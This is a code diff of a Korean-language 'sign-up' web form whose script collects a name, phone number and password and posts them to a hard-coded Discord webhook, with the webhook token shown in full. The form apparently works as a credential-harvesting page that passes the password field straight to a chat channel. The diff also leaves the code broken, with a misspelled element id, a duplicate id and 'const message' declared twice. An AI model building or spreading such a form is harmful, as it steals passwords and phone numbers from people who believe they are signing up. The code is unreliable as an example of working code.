@@ -15,7 +15,7 @@
     <form id="contactForm">
         <h2>정보</h2>
         <input type="text" id="name" placeholder="이름" required>
-        <input id="message" placeholder="전화번호" required>
+        <input id="mesage" placeholder="전화번호" required>
         <textarea id="message" rows="5" placeholder="비밀번호" required></textarea>
         <button type="submit">회원가입</button>
     </form>
@@ -27,7 +27,7 @@
             e.preventDefault();
 
             const name = document.getElementById('name').value;
-            const email = document.getElementById('email').value;
+            const message = document.getElementById('mesage').value;
             const message = document.getElementById('message').value;
 
             const webhookURL = "https://discord.com/api/webhooks/1471394578383765579/eFIe34oh8CFR1a0aK1LxRQJbKrpb1y-rFmXcWKQaxvEUkzP1-WFVD_yEh77DGkU3qcyz";  // ← 반드시 바꾸세요!
